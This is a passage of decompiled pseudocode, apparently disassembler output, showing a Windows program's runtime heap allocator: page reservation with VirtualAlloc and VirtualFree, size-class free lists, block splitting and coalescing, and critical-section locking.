    }
    if ((lpAddress < pvVar5) &&
       (pvVar1 = VirtualAlloc(lpAddress,(int)pvVar5 - (int)lpAddress,0x1000,4),
       pvVar1 == (LPVOID)0x0)) break;
    puVar4 = (undefined4 *)*puVar4;
  }
  *param_3 = (LPVOID)0x0;
  return;
}



void FUN_00401710(int param_1,int param_2,LPVOID *param_3)

{
  LPVOID pvVar1;
  BOOL BVar2;
  LPVOID lpAddress;
  LPVOID pvVar3;
  LPVOID pvVar4;
  undefined4 *puVar5;
  LPVOID pvVar6;
  
  pvVar4 = (LPVOID)(param_1 + 0xfffU & 0xfffff000);
  pvVar3 = (LPVOID)(param_1 + param_2 & 0xfffff000);
  *param_3 = pvVar4;
  param_3[1] = (LPVOID)((int)pvVar3 - (int)pvVar4);
  for (puVar5 = DAT_004195e4; (undefined4 **)puVar5 != &DAT_004195e4; puVar5 = (undefined4 *)*puVar5
      ) {
    pvVar1 = (LPVOID)puVar5[2];
    lpAddress = pvVar1;
    if (pvVar1 < pvVar4) {
      lpAddress = pvVar4;
    }
    pvVar6 = (LPVOID)(puVar5[3] + (int)pvVar1);
    if (pvVar3 < (LPVOID)(puVar5[3] + (int)pvVar1)) {
      pvVar6 = pvVar3;
    }
    if (lpAddress < pvVar6) {
      BVar2 = VirtualFree(lpAddress,(int)pvVar6 - (int)lpAddress,0x4000);
      if (BVar2 == 0) {
        DAT_004195c0 = 2;
      }
    }
  }
  return;
}



void FUN_00401790(int param_1,int **param_2)

{
  int **ppiVar1;
  uint uVar2;
  int *local_18 [2];
  
  uVar2 = param_1 + 0x3fffU & 0xffffc000;
  ppiVar1 = DAT_004195f4;
  do {
    for (; (int ***)ppiVar1 != &DAT_004195f4; ppiVar1 = (int **)*ppiVar1) {
      if ((int)uVar2 <= (int)ppiVar1[3]) {
        FUN_0040167c((uint)ppiVar1[2],uVar2,param_2);
        if (*param_2 == (int *)0x0) {
          return;
        }
        ppiVar1[2] = (int *)((int)ppiVar1[2] + (int)param_2[1]);
        ppiVar1[3] = (int *)((int)ppiVar1[3] - (int)param_2[1]);
        if (ppiVar1[3] != (int *)0x0) {
          return;
        }
        FUN_004013cc((int *)ppiVar1);
        return;
      }
    }
    FUN_004014e8(uVar2,param_2);
    if (*param_2 == (int *)0x0) {
      return;
    }
    FUN_004013e4((int **)&DAT_004195f4,param_2,local_18);
    ppiVar1 = DAT_004195f4;
  } while (local_18[0] != (int *)0x0);
  FUN_004015c4(*param_2,(int)param_2[1],local_18);
  *param_2 = (int *)0x0;
  return;
}



void FUN_00401820(LPVOID param_1,int param_2,LPVOID *param_3)

{
  int **ppiVar1;
  uint uVar2;
  int *local_20;
  int local_1c;
  int *local_18 [2];
  
  uVar2 = param_2 + 0x3fffU & 0xffffc000;
  ppiVar1 = DAT_004195f4;
LAB_00401846:
  do {
    for (; ((int ***)ppiVar1 != &DAT_004195f4 && ((int *)param_1 != ppiVar1[2]));
        ppiVar1 = (int **)*ppiVar1) {
    }
    if ((int *)param_1 == ppiVar1[2]) {
      if ((int)uVar2 <= (int)ppiVar1[3]) goto LAB_004018f3;
      FUN_0040154c((LPVOID)((int)ppiVar1[2] + (int)ppiVar1[3]),uVar2 - (int)ppiVar1[3],&local_20);
      if (local_20 != (int *)0x0) {
        FUN_004013e4((int **)&DAT_004195f4,&local_20,local_18);
        ppiVar1 = DAT_004195f4;
        if (local_18[0] == (int *)0x0) {
          FUN_004015c4(local_20,local_1c,local_18);
          *param_3 = (LPVOID)0x0;
          return;
        }
        goto LAB_00401846;
      }
    }
    FUN_0040154c(param_1,uVar2,&local_20);
    if (local_20 == (int *)0x0) {
LAB_004018f3:
      if (((int *)param_1 != ppiVar1[2]) || ((int)ppiVar1[3] < (int)uVar2)) {
        *param_3 = (LPVOID)0x0;
        return;
      }
      FUN_0040167c((uint)ppiVar1[2],uVar2,param_3);
      if (*param_3 == (LPVOID)0x0) {
        return;
      }
      ppiVar1[2] = (int *)((int)ppiVar1[2] + (int)param_3[1]);
      ppiVar1[3] = (int *)((int)ppiVar1[3] - (int)param_3[1]);
      if (ppiVar1[3] != (int *)0x0) {
        return;
      }
      FUN_004013cc((int *)ppiVar1);
      return;
    }
    FUN_004013e4((int **)&DAT_004195f4,&local_20,local_18);
    ppiVar1 = DAT_004195f4;
    if (local_18[0] == (int *)0x0) {
      FUN_004015c4(local_20,local_1c,local_18);
      *param_3 = (LPVOID)0x0;
      return;
    }
  } while( true );
}



void FUN_00401944(int param_1,int param_2,int **param_3)

{
  uint uVar1;
  uint uVar2;
  int *local_1c;
  int local_18;
  int *local_14;
  int local_10;
  
  uVar1 = param_1 + 0x3fffU & 0xffffc000;
  uVar2 = param_2 + param_1 & 0xffffc000;
  if (uVar1 < uVar2) {
    FUN_00401710(uVar1,uVar2 - uVar1,param_3);
    FUN_004013e4((int **)&DAT_004195f4,param_3,&local_1c);
    if (local_1c != (int *)0x0) {
      FUN_004015c4(local_1c,local_18,&local_14);
      local_1c = local_14;
      local_18 = local_10;
    }
    if (local_1c != (int *)0x0) {
      FUN_00401454((int **)&DAT_004195f4,&local_1c);
    }
  }
  else {
    *param_3 = (int *)0x0;
  }
  return;
}



void FUN_004019d0(void)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_10;
  
  uStack_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_10;
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  if (DAT_00419045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  FUN_00401394(0x4195e4);
  FUN_00401394(0x4195f4);
  FUN_00401394(0x419620);
  DAT_0041961c = LocalAlloc(0,0xff8);
  if (DAT_0041961c != (HLOCAL)0x0) {
    iVar1 = 3;
    do {
      *(undefined4 *)((int)DAT_0041961c + iVar1 * 4 + -0xc) = 0;
      iVar1 = iVar1 + 1;
    } while (iVar1 != 0x401);
    DAT_00419608 = &DAT_00419604;
    DAT_00419604 = &DAT_00419604;
    DAT_00419610 = &DAT_00419604;
    DAT_004195bc = 1;
  }
  *in_FS_OFFSET = uStack_10;
  if (DAT_00419045 != '\0') {
    uStack_10 = 0x401a85;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  return;
}



void FUN_00401a94(void)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_14;
  
  if (DAT_004195bc == '\0') {
    return;
  }
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  if (DAT_00419045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  DAT_004195bc = 0;
  LocalFree(DAT_0041961c);
  DAT_0041961c = (HLOCAL)0x0;
  for (puVar1 = DAT_004195e4; (undefined4 **)puVar1 != &DAT_004195e4; puVar1 = (undefined4 *)*puVar1
      ) {
    VirtualFree((LPVOID)puVar1[2],0,0x8000);
  }
  FUN_00401394(0x4195e4);
  FUN_00401394(0x4195f4);
  FUN_00401394(0x419620);
  puVar1 = DAT_004195dc;
  while (puVar1 != (undefined4 *)0x0) {
    DAT_004195dc = (undefined4 *)*puVar1;
    LocalFree(puVar1);
    puVar1 = DAT_004195dc;
  }
  DAT_004195dc = puVar1;
  *in_FS_OFFSET = uStack_14;
  if (DAT_00419045 != '\0') {
    uStack_14 = 0x401b5f;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  uStack_14 = 0x401b69;
  DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  return;
}



void FUN_00401b74(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  if (param_1 == DAT_00419610) {
    DAT_00419610 = (int *)param_1[1];
  }
  piVar1 = (int *)param_1[1];
  iVar2 = param_1[2];
  if (iVar2 < 0x1001) {
    if (param_1 != piVar1) {
      if (iVar2 < 0) {
        iVar2 = iVar2 + 3;
      }
      *(int **)(DAT_0041961c + -0xc + (iVar2 >> 2) * 4) = piVar1;
      iVar2 = *param_1;
      *piVar1 = iVar2;
      *(int **)(iVar2 + 4) = piVar1;
      return;
    }
    if (iVar2 < 0) {
      iVar2 = iVar2 + 3;
    }
    *(undefined4 *)(DAT_0041961c + -0xc + (iVar2 >> 2) * 4) = 0;
  }
  else {
    iVar2 = *param_1;
    *piVar1 = iVar2;
    *(int **)(iVar2 + 4) = piVar1;
  }
  return;
}



undefined4 * FUN_00401bd8(uint param_1)

{
  undefined4 *puVar1;
  
  puVar1 = DAT_00419620;
  while( true ) {
    if ((undefined4 **)puVar1 == &DAT_00419620) {
      DAT_004195c0 = 3;
      return (undefined4 *)0x0;
    }
    if (((uint)puVar1[2] <= param_1) && (param_1 < (uint)(puVar1[2] + puVar1[3]))) break;
    puVar1 = (undefined4 *)*puVar1;
  }
  return puVar1;
}



void FUN_00401c08(uint *param_1,uint param_2)

{
  uint *puVar1;
  
  puVar1 = (uint *)((int)(uint *)(param_2 - 4) + (int)param_1);
  if (0xf < (int)param_2) {
    *puVar1 = 0x80000007;
    FUN_00401ddc((uint **)param_1,(uint *)(param_2 - 4));
    return;
  }
  if (3 < (int)param_2) {
    *param_1 = param_2 | 0x80000002;
    *puVar1 = param_2 | 0x80000002;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401c38(int param_1)

{
  _DAT_004195ac = _DAT_004195ac + 1;
  _DAT_004195b0 = _DAT_004195b0 + ((*(uint *)(param_1 + -4) & 0x7ffffffc) - 4);
  FUN_0040224c(param_1);
  return;
}



void FUN_00401c5c(uint *param_1,uint param_2)

{
  if (0xb < (int)param_2) {
    *param_1 = param_2 | 2;
    FUN_00401c38((int)(param_1 + 1));
    return;
  }
  if (3 < (int)param_2) {
    *param_1 = param_2 | 0x80000002;
  }
  *(uint *)((int)param_1 + param_2) = *(uint *)((int)param_1 + param_2) & 0xfffffffe;
  return;
}



uint FUN_00401c84(int param_1)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  
  uVar1 = *(uint *)(param_1 + -4);
  if ((uVar1 & 0x80000002) != 0x80000002) {
    DAT_004195c0 = 4;
  }
  uVar3 = uVar1 & 0x7ffffffc;
  puVar2 = (uint *)(param_1 - uVar3);
  if (((uVar1 ^ *puVar2) & 0xfffffffe) != 0) {
    DAT_004195c0 = 5;
  }
  if ((*(byte *)puVar2 & 1) != 0) {
    uVar1 = puVar2[-1];
    if (uVar1 != ((int *)((int)puVar2 - uVar1))[2]) {
      DAT_004195c0 = 6;
    }
    FUN_00401b74((int *)((int)puVar2 - uVar1));
    uVar3 = uVar3 + uVar1;
  }
  return uVar3;
}



uint FUN_00401cf4(uint *param_1)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  
  uVar3 = 0;
  uVar1 = *param_1;
  if ((uVar1 & 0x80000000) != 0) {
    uVar3 = uVar1 & 0x7ffffffc;
    param_1 = (uint *)((int)param_1 + uVar3);
    uVar1 = *param_1;
  }
  if ((uVar1 & 2) == 0) {
    FUN_00401b74((int *)param_1);
    uVar3 = uVar3 + param_1[2];
    puVar2 = (uint *)((int)param_1 + param_1[2]);
    *puVar2 = *puVar2 & 0xfffffffe;
  }
  return uVar3;
}



undefined FUN_00401d2c(uint *param_1,int param_2)

{
  int *piVar1;
  int **ppiVar2;
  uint *puVar3;
  undefined local_1c;
  int *local_1b;
  int local_17;
  
  local_1c = 0;
  ppiVar2 = (int **)FUN_00401bd8((uint)param_1);
  if (ppiVar2 != (int **)0x0) {
    piVar1 = ppiVar2[2];
    if (((int)piVar1 + (int)ppiVar2[3]) - (param_2 + (int)param_1) < 0xd) {
      param_2 = ((int)piVar1 + (int)ppiVar2[3]) - (int)param_1;
    }
    if ((int)param_1 - (int)piVar1 < 0xc) {
      FUN_00401944((int)piVar1,(int)param_1 + (param_2 - (int)ppiVar2[2]),&local_1b);
    }
    else {
      FUN_00401944((int)(param_1 + 1),param_2 + -4,&local_1b);
    }
    if (local_1b != (int *)0x0) {
      FUN_00401c08(param_1,(int)local_1b - (int)param_1);
      puVar3 = (uint *)((int)local_1b + local_17);
      if (puVar3 < (uint *)((int)ppiVar2[2] + (int)ppiVar2[3])) {
        FUN_00401c5c(puVar3,(int)param_1 + (param_2 - (int)puVar3));
      }
      FUN_00401454(ppiVar2,&local_1b);
      local_1c = 1;
    }
  }
  return local_1c;
}



void FUN_00401ddc(uint **param_1,uint *param_2)

{
  uint **ppuVar1;
  uint *puVar2;
  uint **ppuVar3;
  char cVar4;
  
  param_1[2] = param_2;
  *(uint **)((int)param_1 + (int)param_2 + -4) = param_2;
  if ((int)param_2 < 0x1001) {
    if ((int)param_2 < 0) {
      param_2 = (uint *)((int)param_2 + 3);
    }
    ppuVar1 = *(uint ***)(DAT_0041961c + -0xc + ((int)param_2 >> 2) * 4);
    if (ppuVar1 == (uint **)0x0) {
      *(uint ***)(DAT_0041961c + -0xc + ((int)param_2 >> 2) * 4) = param_1;
      param_1[1] = (uint *)param_1;
      *param_1 = (uint *)param_1;
    }
    else {
      puVar2 = *ppuVar1;
      param_1[1] = (uint *)ppuVar1;
      *param_1 = puVar2;
      *ppuVar1 = (uint *)param_1;
      puVar2[1] = (uint)param_1;
    }
  }
  else {
    if ((0x3bff < (int)param_2) &&
       (cVar4 = FUN_00401d2c((uint *)param_1,(int)param_2), cVar4 != '\0')) {
      return;
    }
    ppuVar1 = DAT_00419610;
    puVar2 = *DAT_00419610;
    ppuVar3 = param_1;
    param_1[1] = (uint *)DAT_00419610;
    DAT_00419610 = ppuVar3;
    *param_1 = puVar2;
    *ppuVar1 = (uint *)param_1;
    puVar2[1] = (uint)param_1;
  }
  return;
}



void FUN_00401e64(void)

{
  if (0 < (int)DAT_00419614) {
    if ((int)DAT_00419614 < 0xc) {
      DAT_004195c0 = 7;
    }
    else {
      *DAT_00419618 = DAT_00419614 | 2;
      FUN_00401c38((int)(DAT_00419618 + 1));
      DAT_00419618 = (uint *)0x0;
      DAT_00419614 = 0;
    }
  }
  return;
}



undefined4 FUN_00401eb0(int **param_1)

{
  undefined4 uVar1;
  uint uVar2;
  int *local_1c;
  int *local_18;
  int *local_14;
  int local_10;
  
  local_1c = *param_1;
  local_18 = param_1[1];
  FUN_00401e64();
  FUN_004013e4((int **)&DAT_00419620,&local_1c,&local_14);
  if (local_14 == (int *)0x0) {
    uVar1 = 0;
  }
  else {
    if (local_14 < local_1c) {
      uVar2 = FUN_00401c84((int)local_1c);
      local_1c = (int *)((int)local_1c - uVar2);
      local_18 = (int *)((int)local_18 + uVar2);
    }
    if ((uint *)((int)local_1c + (int)local_18) < (uint *)((int)local_14 + local_10)) {
      uVar2 = FUN_00401cf4((uint *)((int)local_1c + (int)local_18));
      local_18 = (int *)((int)local_18 + uVar2);
    }
    if ((uint *)((int)local_14 + local_10) == (uint *)((int)local_1c + (int)local_18)) {
      FUN_00401c08((uint *)((int)local_1c + (int)local_18) + -1,4);
      local_18 = local_18 + -1;
    }
    DAT_00419618 = local_1c;
    DAT_00419614 = local_18;
    uVar1 = CONCAT31((int3)((uint)local_18 >> 8),1);
  }
  return uVar1;
}



undefined4 FUN_00401f3c(int param_1)

{
  undefined4 uVar1;
  int *local_c [2];
  
  FUN_00401790(param_1 + 4,local_c);
  if ((local_c[0] != (int *)0x0) && (uVar1 = FUN_00401eb0(local_c), (char)uVar1 != '\0')) {
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return 0;
}



undefined4 FUN_00401f68(LPVOID param_1,int param_2)

{
  undefined4 uVar1;
  int *local_10 [2];
  
  FUN_00401820(param_1,param_2 + 4,local_10);
  if ((local_10[0] != (int *)0x0) && (uVar1 = FUN_00401eb0(local_10), (char)uVar1 != '\0')) {
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return 0;
}



int FUN_00401f9c(int param_1)

{
  int iVar1;
  int iVar2;
  
  if (param_1 < 0) {
    param_1 = param_1 + 3;
  }
  iVar2 = param_1 >> 2;
  if (iVar2 < 0x401) {
    do {
      iVar1 = *(int *)(DAT_0041961c + -0xc + iVar2 * 4);
      if (iVar1 != 0) {
        return iVar1;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 != 0x401);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint * FUN_00401fc8(uint param_1)

{
  uint *puVar1;
  uint *puVar2;
  undefined4 uVar3;
  uint uVar4;
  
  while ((puVar1 = DAT_00419610, puVar2 = DAT_00419608, (int)DAT_00419608[2] < (int)param_1 &&
         (uVar4 = DAT_00419610[2], puVar2 = DAT_00419610, (int)uVar4 < (int)param_1))) {
    DAT_00419610[2] = param_1;
    puVar2 = puVar1;
    do {
      puVar2 = (uint *)puVar2[1];
    } while ((int)puVar2[2] < (int)param_1);
    DAT_00419610[2] = uVar4;
    puVar1 = puVar2;
    if ((puVar2 != DAT_00419610) ||
       (((int)param_1 < 0x1001 &&
        (puVar2 = (uint *)FUN_00401f9c(param_1), puVar1 = DAT_00419610, puVar2 != (uint *)0x0))))
    break;
    uVar3 = FUN_00401f3c(param_1);
    puVar2 = DAT_00419618;
    if ((char)uVar3 == '\0') {
      return (uint *)0x0;
    }
    if ((int)param_1 <= DAT_00419614) {
      DAT_00419614 = DAT_00419614 - param_1;
      if (DAT_00419614 < 0xc) {
        param_1 = param_1 + DAT_00419614;
        DAT_00419614 = 0;
      }
      DAT_00419618 = (uint *)((int)DAT_00419618 + param_1);
      *puVar2 = param_1 | 2;
      _DAT_004195ac = _DAT_004195ac + 1;
      _DAT_004195b0 = _DAT_004195b0 + (param_1 - 4);
      return puVar2 + 1;
    }
  }
  DAT_00419610 = puVar1;
  FUN_00401b74((int *)puVar2);
  uVar4 = puVar2[2];
  if ((int)(uint *)(uVar4 - param_1) < 0xc) {
    if (puVar2 == DAT_00419610) {
      DAT_00419610 = (uint *)puVar2[1];
    }
    *(uint *)((int)puVar2 + uVar4) = *(uint *)((int)puVar2 + uVar4) & 0xfffffffe;
  }
  else {
    FUN_00401ddc((uint **)((int)puVar2 + param_1),(uint *)(uVar4 - param_1));
    uVar4 = param_1;
  }
  *puVar2 = uVar4 | 2;
  _DAT_004195ac = _DAT_004195ac + 1;
  _DAT_004195b0 = _DAT_004195b0 + (uVar4 - 4);
  return puVar2 + 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint * FUN_004020bc(int param_1)

{
  uint *puVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  undefined uVar6;
  undefined extraout_CL;
  uint uVar7;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar8;
  undefined *puVar9;
  
  if (((DAT_004195bc == '\0') && (cVar2 = FUN_004019d0(), cVar2 == '\0')) || (0x7ffffff8 < param_1))
  {
    return (uint *)0x0;
  }
  uVar6 = 0;
  puVar9 = &LAB_00402238;
  uVar8 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffdc;
  if (DAT_00419045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
    uVar6 = extraout_CL;
  }
  puVar5 = DAT_00419618;
  uVar7 = param_1 + 7U & 0xfffffffc;
  if ((int)uVar7 < 0xc) {
    uVar7 = 0xc;
  }
  if ((int)uVar7 < 0x1001) {
    uVar3 = uVar7;
    if ((int)uVar7 < 0) {
      uVar3 = uVar7 + 3;
    }
    puVar1 = *(uint **)((DAT_0041961c - 0xc) + ((int)uVar3 >> 2) * 4);
    if (puVar1 != (uint *)0x0) {
      *(uint *)((int)puVar1 + uVar7) = *(uint *)((int)puVar1 + uVar7) & 0xfffffffe;
      uVar3 = DAT_0041961c;
      puVar5 = (uint *)puVar1[1];
      if (puVar1 == puVar5) {
        uVar4 = uVar7;
        if ((int)uVar7 < 0) {
          uVar4 = uVar7 + 3;
        }
        *(undefined4 *)((DAT_0041961c - 0xc) + ((int)uVar4 >> 2) * 4) = 0;
      }
      else {
        uVar3 = uVar7;
        if ((int)uVar7 < 0) {
          uVar3 = uVar7 + 3;
        }
        *(uint **)((DAT_0041961c - 0xc) + ((int)uVar3 >> 2) * 4) = puVar5;
        uVar3 = *puVar1;
        *(uint **)(uVar3 + 4) = puVar5;
        *puVar5 = uVar3;
      }
      *puVar1 = puVar1[2] | 2;
      _DAT_004195ac = _DAT_004195ac + 1;
      _DAT_004195b0 = _DAT_004195b0 + (uVar7 - 4);
      FUN_00403b68((char)(puVar1 + 1),(char)(puVar1[2] | 2),(char)uVar3,uVar8,puVar9);
      return puVar1 + 1;
    }
  }
  if ((int)uVar7 <= DAT_00419614) {
    DAT_00419614 = DAT_00419614 - uVar7;
    if (DAT_00419614 < 0xc) {
      uVar7 = uVar7 + DAT_00419614;
      DAT_00419614 = 0;
    }
    DAT_00419618 = (uint *)((int)DAT_00419618 + uVar7);
    *puVar5 = uVar7 | 2;
    puVar5 = puVar5 + 1;
    _DAT_004195ac = _DAT_004195ac + 1;
    _DAT_004195b0 = _DAT_004195b0 + (uVar7 - 4);
    FUN_00403b68((char)puVar5,(char)(uVar7 | 2),uVar6,uVar8,puVar9);
    return puVar5;
  }
  FUN_00401fc8(uVar7);
  puVar5 = (uint *)0x0;
  *in_FS_OFFSET = uVar8;
  if (DAT_00419045 != '\0') {
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  return puVar5;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040224c(int param_1)

{
  char cVar1;
  uint *puVar2;
  undefined4 uVar3;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_CL_01;
  undefined uVar4;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  uint *puVar5;
  uint **ppuVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar7;
  undefined *puVar8;
  
  DAT_004195c0 = 0;
  if ((DAT_004195bc == '\0') && (cVar1 = FUN_004019d0(), in_DL = extraout_DL, cVar1 == '\0')) {
    DAT_004195c0 = 8;
    return 8;
  }
  uVar4 = 0;
  puVar8 = &LAB_004023de;
  uVar7 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffe0;
  if (DAT_00419045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
    in_DL = extraout_DL_00;
    uVar4 = extraout_CL;
  }
  ppuVar6 = (uint **)(param_1 + -4);
  puVar5 = *ppuVar6;
  if (((uint)puVar5 & 2) == 0) {
    DAT_004195c0 = 9;
    goto LAB_004023b5;
  }
  _DAT_004195ac = _DAT_004195ac + -1;
  _DAT_004195b0 = _DAT_004195b0 - (((uint)puVar5 & 0x7ffffffc) - 4);
  if (((uint)puVar5 & 1) != 0) {
    puVar2 = *(uint **)(param_1 + -8);
    if (((int)puVar2 < 0xc) || (((uint)puVar2 & 0x80000003) != 0)) {
      DAT_004195c0 = 10;
      goto LAB_004023b5;
    }
    ppuVar6 = (uint **)((int)ppuVar6 - (int)puVar2);
    if (puVar2 != ppuVar6[2]) {
      DAT_004195c0 = 10;
      goto LAB_004023b5;
    }
    puVar5 = (uint *)((int)puVar5 + (int)puVar2);
    FUN_00401b74((int *)ppuVar6);
    uVar4 = extraout_CL_00;
    in_DL = extraout_DL_01;
  }
  puVar5 = (uint *)((uint)puVar5 & 0x7ffffffc);
  puVar2 = (uint *)((int)ppuVar6 + (int)puVar5);
  if (puVar2 == DAT_00419618) {
    DAT_00419618 = (uint *)((int)DAT_00419618 - (int)puVar5);
    DAT_00419614 = DAT_00419614 + (int)puVar5;
    if (0x3c00 < DAT_00419614) {
      FUN_00401e64();
      uVar4 = extraout_CL_01;
      in_DL = extraout_DL_02;
    }
    FUN_00403b68(0,in_DL,uVar4,uVar7,puVar8);
    return 0;
  }
  if ((*puVar2 & 2) == 0) {
    if (((puVar2[1] == 0) || (*puVar2 == 0)) || ((int)puVar2[2] < 0xc)) {
      DAT_004195c0 = 0xb;
      goto LAB_004023b5;
    }
    puVar5 = (uint *)((int)puVar5 + puVar2[2]);
    FUN_00401b74((int *)puVar2);
  }
  else {
    if ((*puVar2 & 0x7ffffffc) < 4) {
      DAT_004195c0 = 0xb;
      goto LAB_004023b5;
    }
    *puVar2 = *puVar2 | 1;
  }
  FUN_00401ddc(ppuVar6,puVar5);
LAB_004023b5:
  uVar3 = 0;
  *in_FS_OFFSET = uVar7;
  if (DAT_00419045 != '\0') {
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  return uVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_004023f0(int param_1,int param_2)

{
  uint uVar1;
  int *piVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint *puVar5;
  uint *puVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint local_18;
  int local_14;
  
  uVar7 = param_2 + 7U & 0xfffffffc;
  if ((int)uVar7 < 0xc) {
    uVar7 = 0xc;
  }
  puVar6 = (uint *)(param_1 + -4);
  uVar9 = *puVar6 & 0x7ffffffc;
  piVar2 = (int *)((int)puVar6 + uVar9);
  if (uVar9 == uVar7) {
    uVar3 = CONCAT31((int3)((uint)piVar2 >> 8),1);
  }
  else {
    uVar8 = uVar7;
    if ((int)uVar7 < (int)uVar9) {
      local_18 = uVar9 - uVar7;
      if (piVar2 == DAT_00419618) {
        DAT_00419618 = (int *)((int)DAT_00419618 - local_18);
        DAT_00419614 = DAT_00419614 + local_18;
        if (DAT_00419614 < 0xc) {
          DAT_00419618 = (int *)((int)DAT_00419618 + local_18);
          DAT_00419614 = DAT_00419614 - local_18;
          uVar8 = uVar9;
        }
      }
      else {
        if ((*(byte *)piVar2 & 2) == 0) {
          local_18 = local_18 + piVar2[2];
          FUN_00401b74(piVar2);
        }
        uVar8 = uVar9;
        if (0xb < (int)local_18) {
          *(uint *)((int)puVar6 + uVar7) = local_18 | 2;
          FUN_00401c38((int)((uint *)((int)puVar6 + uVar7) + 1));
          uVar8 = uVar7;
        }
      }
LAB_004025aa:
      _DAT_004195b0 = _DAT_004195b0 + (uVar8 - uVar9);
      uVar7 = *puVar6;
      *puVar6 = uVar8 | uVar7 & 0x80000003;
      uVar3 = CONCAT31((int3)((uVar7 & 0x80000003) >> 8),1);
    }
    else {
      do {
        local_14 = uVar7 - uVar9;
        if ((int *)((int)puVar6 + uVar9) == DAT_00419618) {
          if (local_14 <= DAT_00419614) {
            DAT_00419614 = DAT_00419614 - local_14;
            DAT_00419618 = (int *)((int)DAT_00419618 + local_14);
            if (DAT_00419614 < 0xc) {
              DAT_00419618 = (int *)((int)DAT_00419618 + DAT_00419614);
              uVar7 = uVar7 + DAT_00419614;
              DAT_00419614 = 0;
            }
            _DAT_004195b0 = _DAT_004195b0 + (uVar7 - uVar9);
            uVar9 = *puVar6;
            *puVar6 = uVar7 | uVar9 & 0x80000003;
            return CONCAT31((int3)((uVar9 & 0x80000003) >> 8),1);
          }
          FUN_00401e64();
        }
        puVar4 = (uint *)((int)puVar6 + uVar9);
        if ((*(byte *)puVar4 & 2) == 0) {
          uVar1 = puVar4[2];
          if (local_14 <= (int)uVar1) {
            FUN_00401b74((int *)puVar4);
            puVar4 = (uint *)(uVar1 - local_14);
            if ((int)puVar4 < 0xc) {
              puVar5 = (uint *)((int)puVar6 + uVar7 + (int)puVar4);
              *puVar5 = *puVar5 & 0xfffffffe;
              uVar8 = uVar7 + (int)puVar4;
            }
            else {
              FUN_00401ddc((uint **)((int)puVar6 + uVar7),puVar4);
            }
            goto LAB_004025aa;
          }
          puVar4 = (uint *)((int)puVar4 + uVar1);
          local_14 = local_14 - uVar1;
        }
      } while (((*puVar4 & 0x80000000) != 0) &&
              (uVar3 = FUN_00401f68((LPVOID)((*puVar4 & 0x7ffffffc) + (int)puVar4),local_14),
              (char)uVar3 != '\0'));
      uVar3 = 0;
    }
  }
  return uVar3;
}



undefined4 FUN_004025cc(undefined4 *param_1,uint param_2)

{
  char cVar1;
  undefined4 uVar2;
  uint *puVar3;
  uint uVar4;
  undefined4 *in_FS_OFFSET;
  undefined *puStack_20;
  
  if ((DAT_004195bc == '\0') && (cVar1 = FUN_004019d0(), cVar1 == '\0')) {
    return 0;
  }
  puStack_20 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_20;
  if (DAT_00419045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  uVar2 = FUN_004023f0((int)param_1,param_2);
  if ((char)uVar2 == '\0') {
    puVar3 = FUN_004020bc(param_2);
    uVar4 = (param_1[-1] & 0x7ffffffc) - 4;
    if ((int)param_2 < (int)uVar4) {
      uVar4 = param_2;
    }
    if (puVar3 != (uint *)0x0) {
      FUN_00402890(param_1,puVar3,uVar4);
      FUN_0040224c((int)param_1);
    }
  }
  uVar2 = 0;
  *in_FS_OFFSET = puStack_20;
  if (DAT_00419045 != '\0') {
    puStack_20 = &LAB_0040267c;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004195c4);
  }
  return uVar2;
}



int FUN_00402690(int param_1)

{
  int iVar1;
  
  if (param_1 < 1) {
    iVar1 = 0;
  }
  else {
    iVar1 = (*(code *)PTR_FUN_00418044)();
    if (iVar1 == 0) {
      FUN_00402778(1);
    }
  }
  return iVar1;
}



int FUN_004026b0(int param_1)

{
  int iVar1;
  
  if (param_1 == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = (*(code *)PTR_FUN_00418048)();
    if (iVar1 != 0) {
      FUN_00402778(CONCAT31((int3)((uint)iVar1 >> 8),2));
    }
  }
  return iVar1;
}



void FUN_004026d0(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
